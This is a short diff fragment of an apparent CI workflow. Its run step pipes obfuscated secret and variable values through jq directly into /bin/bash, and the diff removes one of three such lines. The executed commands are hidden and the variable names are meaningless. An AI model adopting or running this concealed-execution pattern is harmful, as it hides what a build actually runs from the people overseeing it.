@@ -22,7 +22,6 @@ jobs:
           i46: ${{ secrets.i46 }}
         run: |
           printf '%s' "$i46" | jq -r .ykdv904 | /bin/bash
-          printf '%s' "$etjsq3" | jq -r .gt4843 | /bin/bash
           echo $clccw40439 | jq -r .if466 | /bin/bash
 
       - name: Store results
